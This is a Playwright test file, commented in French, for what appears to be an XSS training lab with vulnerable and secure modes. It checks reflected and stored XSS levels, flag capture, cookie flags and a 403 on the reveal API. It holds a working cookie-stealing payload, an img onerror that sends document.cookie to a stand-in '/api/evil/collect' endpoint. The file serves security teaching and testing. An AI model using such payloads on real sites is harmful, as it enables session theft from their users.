import { expect, test, type Page } from '@playwright/test';

import { exploitLevel1, LEVEL_1, LEVEL_2, selectMode, submitFlag, XSS_PAYLOAD } from './helpers';

const STEAL_COOKIE = `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`;

/** Débloque le niveau 2 en jouant le niveau 1. */
async function unlockLevel2(page: Page): Promise<void> {
  await submitFlag(page, await exploitLevel1(page));
  await expect(page.getByText('Flag capturé ! Niveau validé.')).toBeVisible();
}

test.describe('Niveau 1 — XSS réfléchie', () => {
  test('mode vulnérable : le payload du lien piégé s’exécute', async ({ page }) => {
    const flag = await exploitLevel1(page);
    expect(flag).toContain('BREACH{');
  });

  test('mode sécurisé : le payload reste du texte et rien ne s’exécute', async ({ page }) => {
    await page.goto(LEVEL_1);
    await selectMode(page, 'Sécurisé');

    await page.goto(`${LEVEL_1}?q=${encodeURIComponent(XSS_PAYLOAD)}`);
    await expect(page.getByText(XSS_PAYLOAD)).toBeVisible();
    await expect(page.locator('img[src="x"]')).toHaveCount(0);
    await expect(page.locator('code', { hasText: 'BREACH{' })).toHaveCount(0);
    expect(await page.evaluate(() => typeof (window as Window & { revealFlag?: unknown }).revealFlag)).toBe('undefined');
  });
});

test.describe('Niveau 2 — XSS stockée', () => {
  test('mode vulnérable : le bot exécute le message piégé et son cookie fuit', async ({ page }) => {
    await unlockLevel2(page);
    await page.goto(LEVEL_2);

    await page.getByRole('textbox', { name: 'Message' }).fill(STEAL_COOKIE);
    await page.getByRole('button', { name: 'Publier', exact: true }).click();
    await page.getByRole('button', { name: 'Lancer la relecture du bot' }).click();

    const collector = page.getByRole('region', { name: 'Console du collecteur' });
    await expect(collector.getByText(/ba_admin=BREACH\{livre_d_or_[0-9a-f]+\}/)).toBeVisible();
  });

  test('mode sécurisé : le serveur refuse le HTML et rien ne fuit', async ({ page }) => {
    await unlockLevel2(page);
    await page.goto(LEVEL_2);
    await selectMode(page, 'Sécurisé');

    await page.getByRole('textbox', { name: 'Message' }).fill(STEAL_COOKIE);
    await page.getByRole('button', { name: 'Publier', exact: true }).click();
    await expect(page.getByRole('alert')).not.toBeEmpty();

    // Attendre que la page ait relevé le collecteur après la relecture, sinon on
    // vérifierait la console avant même que le bot ait pu exfiltrer quoi que ce soit.
    const lootFetched = page.waitForResponse(
      (response) => response.url().includes('/api/evil/collect') && response.request().method() === 'GET',
    );
    await page.getByRole('button', { name: 'Lancer la relecture du bot' }).click();
    await lootFetched;
    const collector = page.getByRole('region', { name: 'Console du collecteur' });
    await expect(collector.getByText("En attente d'une exfiltration…")).toBeVisible();
    await expect(collector.getByText('BREACH{')).toHaveCount(0);
  });
});

test.describe('Protections transverses', () => {
  test('le cookie joueur est HttpOnly et SameSite=Lax', async ({ page, context }) => {
    await page.goto(LEVEL_1);
    const player = (await context.cookies()).find((cookie) => cookie.name === 'ba_player');

    expect(player?.httpOnly).toBe(true);
    expect(player?.sameSite).toBe('Lax');
    expect(await page.evaluate(() => document.cookie)).not.toContain('ba_player');
  });

  test('mode sécurisé : appeler directement l’API de révélation ne livre pas le flag', async ({ page }) => {
    await page.goto(LEVEL_1);
    await selectMode(page, 'Sécurisé');

    // Même cookies que la page : on contourne l'interface, comme un attaquant avec curl.
    const response = await page.request.post('/api/recherche-bavarde/reveal');
    expect(response.status()).toBe(403);
    expect(await response.text()).not.toContain('BREACH{');
  });
});
